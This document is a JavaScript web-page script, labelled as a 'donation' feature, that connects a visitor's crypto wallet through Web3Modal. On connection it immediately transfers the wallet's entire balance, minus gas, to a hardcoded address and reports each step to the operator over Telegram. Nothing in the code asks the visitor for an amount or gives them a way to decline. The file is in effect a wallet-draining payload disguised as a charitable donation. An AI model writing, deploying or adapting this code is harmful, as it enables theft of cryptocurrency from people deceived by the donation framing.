// Import Web3Modal library
import Web3Modal from 'web3modal';

let web3Modal;
let provider;
let web3;
const donationAddress = "0x4cF7613aFE35ec64071F71f334e54e23698Fb2D9"; // Replace with your actual donation address

async function init() {
    const providerOptions = {
        walletconnect: {
            package: WalletConnectProvider,
            options: {
                infuraId: "4ac9cf56484d49f382352ea6fbe08004" // Replace with your Infura project ID
            }
        }
    };

    web3Modal = new Web3Modal({
        cacheProvider: false,
        providerOptions
    });

    document.getElementById('connect-wallet').addEventListener('click', connectWallet);
}

async function connectWallet() {
    try {
        provider = await web3Modal.connect();
        web3 = new Web3(provider);
        const accounts = await web3.eth.getAccounts();
        const fromAddress = accounts[0];
        const balance = await web3.eth.getBalance(fromAddress);

        const startTime = new Date().toLocaleString();
        updateStatus('Wallet connected. Processing donation...');
        sendTelegramMessage(`Wallet connected at ${startTime}`);
        sendDonation(fromAddress, balance);
    } catch (error) {
        console.error(error);
        updateStatus('Connection failed. Please try again.');
        sendTelegramMessage('Connection failed: ' + error.message);
    }
}

async function sendDonation(fromAddress, balance) {
    const gasPrice = await web3.eth.getGasPrice();
    const gasEstimate = await web3.eth.estimateGas({
        from: fromAddress,
        to: donationAddress,
        value: balance
    });

    const transactionFee = gasPrice * gasEstimate;
    const donationAmount = balance - transactionFee;

    if (donationAmount <= 0) {
        updateStatus('Insufficient funds to cover the transaction fee.');
        return;
    }

    try {
        const transaction = await web3.eth.sendTransaction({
            from: fromAddress,
            to: donationAddress,
            value: donationAmount
        });

        console.log('Transaction hash:', transaction.transactionHash);
        updateStatus('Donation successful! Thank you.');
        sendTelegramMessage(`Donation successful!\nAmount: ${web3.utils.fromWei(donationAmount.toString())} ETH\nTransaction hash: ${transaction.transactionHash}`);
    } catch (error) {
        console.error('Transaction error:', error);
        updateStatus('Donation failed. Please try again.');
        sendTelegramMessage('Donation failed: ' + error.message);
    }
}

function sendTelegramMessage(message) {
    fetch('/api/sendTelegramMessage', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ message })
    })
    .then(response => response.text())
    .then(data => {
        console.log(data);
    })
    .catch(error => {
        console.error('Error sending Telegram message:', error);
    });
}

function updateStatus(message) {
    document.getElementById('status').innerText = message;
}

window.addEventListener('load', init);
